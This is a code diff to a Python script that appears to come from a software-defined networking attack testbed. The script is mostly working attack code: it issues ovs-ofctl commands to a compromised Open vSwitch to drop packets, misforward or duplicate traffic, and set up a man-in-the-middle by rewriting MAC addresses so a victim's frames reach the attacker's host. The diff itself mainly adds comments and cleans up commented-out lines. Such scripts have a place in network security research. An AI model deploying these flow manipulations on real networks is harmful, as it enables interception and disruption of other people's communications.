@@ -23,8 +23,7 @@ victim_mac = sys.argv[4]
 # Receiver of victim's messages
 victim_rec_mac = sys.argv[5]
   
-#flows = check_output("ovs-ofctl -O OpenFlow13 dump-flows " + str(atk_switch), shell=True)
-
+# We need to specify flow by setting dl_src and dl_dst
 dl_src = ""
 dl_dst = ""
 del_flow = ""
@@ -48,6 +47,9 @@ else:
     del_flow = " " + dl_dst
     add_flow = dl_dst
 
+# If mode is mod-flows we need first to delete specified flow
+# We print information to app, which called this, so it could find set flow in 
+# flow tables
 if atk_type == 'drop':
     # Packet drop attack
     if mode == 'mod-flows':
@@ -73,25 +75,25 @@ elif atk_type == 'incorrect_forwarding':
     print(print_flow + " actions=output:1")
 
 else:
+    # If attack requires to disguise set flow, we need to connect to server
+    # and check if this flow passes through compromised switch
     server_addr = sys.argv[6].split('h')[1:]
     ip_addr = set()
     for addr in server_addr:
       ip_addr.add(addr)
-#    print(ip_addr)
 
     for i in ip_addr:
-        # Try to connet to next host
+        # Try to connet to server on next host, server is launched on port 5555
         sock = socket.socket()
         sock.connect(("10.0.0." + str(i), 5555))
         sock.send("Message")
         sock.close()
 
-        # Check if connection line went through corrupted switch
+        # Check if connection line went through compromised switch
         result = check_output("ifconfig", shell=True)
         my_mac = re.findall(r'\w\w:\w\w:\w\w:\w\w:\w\w:\w\w', result)[0]
-#        print(my_mac)
 
-        # Receiver mac, for changig rule for another side
+        # We need to get receiver mac, for changing rule for another side
         result = check_output("arp -a", shell=True)
         arp_list = result.split('\n')
         for arp_elem in arp_list:
@@ -115,9 +117,9 @@ else:
         # If we found our connection, we can stop searching and change rules
         if my_port != 0:
             # To find rule for another side
-#            my_str_port = ':' + str(my_port) + ' '
             result = check_output("ovs-ofctl -O OpenFlow13 dump-flows " + str(atk_switch), shell=True) 
 
+            # Let's find victim port - for new rule
             rule_list = result.split('\n');
             for rule in rule_list:
                 flow_list = re.findall(r'dl_dst=' + victim_mac, rule)
@@ -125,17 +127,11 @@ else:
                     victim_port = re.findall(r'output:\d*', rule)[0]
                     victim_port = int(re.findall(r'\d+', victim_port)[0])
 
-#            shift = result.find(victim_mac)
-#            if shift != -1:
-#                num = result.find('actions=write_actions(output:', shift, 
-#                      shift+100)
-#                if num != -1:
-#                    victim_port = result[num + len('actions=write_actions(output:')]
-
             if atk_type == 'duplicate':
                 # Duplicate forwarding attack
                 if mode == 'mod-flows':
-                    call("ovs-ofctl -O OpenFlow13 del-flows " + str(atk_switch) + del_flow + ",actions=output:" + str(victim_port), shell=True)
+#                    call("ovs-ofctl -O OpenFlow13 del-flows " + str(atk_switch) + del_flow + ",actions=output:" + str(victim_port), shell=True)
+                    call("ovs-ofctl -O OpenFlow13 del-flows " + str(atk_switch) + del_flow, shell=True)
                     mode = 'add-flow'
 
                 call("ovs-ofctl -O OpenFlow13 "+mode+" " + str(atk_switch) + " priority=100," + add_flow + ",actions=output:" + str(victim_port) + ",mod_dl_dst:" + str(my_mac) + ",mod_dl_src:" + str(rec_mac) + ",output:" + str(my_port) + ",goto_table:1", shell=True)
@@ -145,11 +141,16 @@ else:
             elif atk_type == 'MitM':
                 # Man-in-the-Middle attack
                 if mode == 'mod-flows':
-                    call("ovs-ofctl -O OpenFlow13 del-flows " + str(atk_switch) + del_flow + ",actions=output:" + str(victim_port), shell=True)
+#                    call("ovs-ofctl -O OpenFlow13 del-flows " + str(atk_switch) + del_flow + ",actions=output:" + str(victim_port), shell=True)
+                    call("ovs-ofctl -O OpenFlow13 del-flows " + str(atk_switch) + del_flow, shell=True)
                     mode = 'add-flow'
 
-                call("ovs-ofctl -O OpenFlow13 "+mode+" " + str(atk_switch) + " priority=100,dl_dst=" + str(victim_mac) + ",actions=mod_dl_dst:" + str(my_mac) + ",mod_dl_src:" + str(rec_mac) + ",output:" + str(my_port), shell=True)
-                call("ovs-ofctl -O OpenFlow13 "+mode+" " + str(atk_switch) + " priority=100,dl_dst=" + str(rec_mac) + ",actions=mod_dl_dst:" + str(victim_mac) + ",mod_dl_src:" + str(victim_rec_mac) + ",output:" + str(victim_port), shell=True)
+                command1 = "ovs-ofctl -O OpenFlow13 "+mode+" " + str(atk_switch) + " priority=100,dl_dst=" + str(victim_mac) + ",actions=mod_dl_dst:" + str(my_mac) + ",mod_dl_src:" + str(rec_mac) + ",output:" + str(my_port)
+                call(command1, shell=True)
+                #print(command1)
+                command2 = "ovs-ofctl -O OpenFlow13 "+mode+" " + str(atk_switch) + " priority=100,dl_dst=" + str(rec_mac) + ",actions=mod_dl_dst:" + str(victim_mac) + ",mod_dl_src:" + str(victim_rec_mac) + ",output:" + str(victim_port)
+                call(command2, shell=True)
+                #print(command2)
                 print("dl_dst="+str(victim_mac) + " actions=set_field:" + str(my_mac) + " set_field:" + str(rec_mac) + " output:" + str(my_port))
 
             break
